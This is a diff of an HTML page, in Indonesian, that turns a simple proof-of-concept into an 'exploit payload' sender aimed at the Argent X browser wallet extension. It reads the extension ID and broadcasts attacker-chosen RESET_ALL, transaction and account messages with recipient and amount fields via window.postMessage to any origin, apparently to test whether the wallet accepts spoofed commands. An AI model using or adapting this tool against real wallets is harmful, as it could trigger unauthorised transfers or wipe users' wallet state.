@@ -2,31 +2,59 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>PoC dApp Wallet Interaction</title>
+    <title>Advanced Wallet Fuzzer</title>
 </head>
 <body>
-    <h1>Security Test Interface</h1>
-    <button id="btnReset" style="padding: 20px; background: red; color: white;">Trigger RESET_ALL</button>
-    <pre id="log" style="background: #eee; padding: 10px;"></pre>
+    <h1>Security Test: Transaction Fuzzer</h1>
+    
+    <div>
+        <label>Pilih Tipe:</label>
+        <select id="msgType">
+            <option value="RESET_ALL">RESET_ALL</option>
+            <option value="TransactionMessage">TransactionMessage</option>
+            <option value="AccountMessage">AccountMessage</option>
+        </select>
+    </div>
+
+    <div style="margin-top: 10px;">
+        <label>Payload (JSON):</label><br>
+        <textarea id="payloadData" rows="5" style="width: 100%;">
+{
+  "to": "0xTargetAddress...",
+  "amount": "0.01",
+  "data": "0x"
+}
+        </textarea>
+    </div>
+
+    <button id="sendBtn" style="padding: 15px; margin-top: 10px; background: red; color: white;">Kirim Payload Eksploit</button>
+    <pre id="log" style="background: #eee; padding: 10px; margin-top: 10px;"></pre>
 
     <script>
         const log = (msg) => document.getElementById('log').innerText += msg + '\n';
 
-        document.getElementById('btnReset').addEventListener('click', () => {
-            // Target: MiscenalleousMessage seperti yang terlihat di 1000163978.png
+        document.getElementById('sendBtn').addEventListener('click', () => {
+            const type = document.getElementById('msgType').value;
+            let customData = {};
+            
+            try {
+                customData = JSON.parse(document.getElementById('payloadData').value);
+            } catch (e) {
+                log("Error: Format JSON salah!");
+                return;
+            }
+
+            const extId = document.getElementById("argent-x-extension")?.getAttribute("data-extension-id") || "unknown";
+            
             const payload = {
-                type: "RESET_ALL",
-                // Terkadang diperlukan extensionId jika listener melakukan validasi asal
-                extensionId: document.getElementById("argent-x-extension")?.getAttribute("data-extension-id") || "unknown"
+                type: type,
+                extensionId: extId,
+                ...customData // Menyertakan data transaksi/akun
             };
 
-            log("Mengirim pesan: " + JSON.stringify(payload));
-
-            // Mengirim ke seluruh jendela (window)
-            // Dalam dApp browser, window.postMessage sering dipantau oleh content script wallet
+            log("Mengirim: " + JSON.stringify(payload));
             window.postMessage(payload, "*"); 
-            
-            log("Pesan telah dikirim.");
+            log("Pesan dikirim.");
         });
     </script>
 </body>
